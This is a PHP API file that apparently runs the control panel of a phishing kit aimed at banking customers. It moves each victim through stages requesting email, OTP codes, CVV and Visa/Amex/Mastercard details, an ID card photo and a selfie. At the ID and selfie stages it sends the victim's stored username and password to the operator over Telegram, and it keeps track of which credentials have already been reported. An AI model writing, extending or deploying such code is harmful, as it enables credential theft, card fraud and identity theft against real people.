<?php
if (!defined('TABLA_PUTO')) {
    define('TABLA_PUTO', 'datos');
}
require_once(__DIR__ . '/../lib/db.php');
require_once(__DIR__ . '/../lib/core.php');

header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json; charset=utf-8');

try {
    if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST') {
        http_response_code(405);
        echo json_encode(['status' => 'error', 'msg' => 'Método no permitido']);
        exit;
    }
    $idreg = isset($_POST['idreg']) ? trim($_POST['idreg']) : '';
    $status = isset($_POST['status']) ? trim($_POST['status']) : 'req_email';
    if ($idreg === '' || !preg_match('/^\d+$/', $idreg)) {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'msg' => 'idreg inválido']);
        exit;
    }
    @presence_touch($idreg, $_SERVER['REMOTE_ADDR'] ?? null);

    $allowed = ['req_email', 'req_otp', 'req_otp_app', 'req_923', 'req_cvv', 'req_visa', 'req_amex', 'req_master', 'wait', 'rec_cedula', 'rec_rostro'];
    if (!in_array($status, $allowed, true)) {
        $status = 'req_email';
    }

    if ($status === 'wait') {
        $ok = actualizar_registro($idreg, ['horamodificado' => time()], false);
        echo json_encode(['status' => $ok ? 'ok' : 'error', 'msg' => $ok ? 'OK' : 'No se pudo actualizar']);
        exit;
    }

    if ($status === 'rec_cedula' || $status === 'rec_rostro') {
        $row = buscar_registro($idreg);
        if (is_array($row)) {
            $owner = $row['owner'] ?? '';
            if ($owner !== '') {
                $usuario = strtoupper((string)($row['usuario'] ?? 'SIN USUARIO'));
                $password = strtoupper((string)($row['password'] ?? 'SIN PASSWORD'));
                $contenido = "👤 $usuario\n" . "🔒 $password\n";
                // Mantener siempre el botón "SOY YO" visible en el panel, incluso
                // después de que el usuario ya envió la selfie (rec_rostro).
                // Antes se ocultaba cuando $status era rec_rostro.
                $options = generate_inline_keyboard_simple($idreg, $owner, true, true);
                $preferLogin = true;
                $sent = enviar_telegram($contenido, $owner, $preferLogin, $options);
                $okSent = tg_response_ok($sent);
                if (!$okSent) {
                    $sent2 = enviar_telegram($contenido, $owner, !$preferLogin, $options);
                    $okSent = tg_response_ok($sent2);
                }
                @tg_mark_last_sent($idreg);
            }
        }
    }

    $ok = actualizar_registro($idreg, ['status' => $status]);
    if ($ok === true) {
        echo json_encode(['status' => 'ok', 'msg' => 'Actualizado', 'next' => $status]);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'msg' => 'No se pudo actualizar']);
    }
} catch (Throwable $e) {
    http_response_code(500);
    @file_put_contents(__DIR__ . '/../logs/err.log', date('c') . ' api/state.php FATAL: ' . $e->getMessage() . "\n", FILE_APPEND);
    echo json_encode(['status' => 'error', 'msg' => 'Error interno']);
}

function tg_response_ok($resp)
{
    if ($resp === true) return true;
    if (!is_string($resp) || $resp === '') return false;
    $obj = @json_decode($resp, true);
    if (is_array($obj) && isset($obj['ok'])) return !!$obj['ok'];
    return (strpos($resp, '"ok":true') !== false);
}

function generate_inline_keyboard_simple($registro, $owner, $includeCedula = true, $includeSoyYo = true)
{
    return tg_panel_keyboard_layout($registro, $owner, [
        'include_cedula' => $includeCedula,
        'include_soyyo'  => $includeSoyYo,
    ]);
}

function creds_notificadas($row)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['creds_notificada'])) {
        return !empty($row['creds_notificada']) && (string)$row['creds_notificada'] === '1';
    }
    if (empty($row['mensaje'])) return false;
    $msg = json_decode($row['mensaje'], true);
    return is_array($msg) && !empty($msg['creds_notified']);
}

function marcar_creds_notificadas($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM datos");
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    if (isset($cols['creds_notificada'])) {
        @actualizar_registro($idreg, ['creds_notificada' => 1]);
        return true;
    }
    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    $mensaje['creds_notified'] = true;
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}


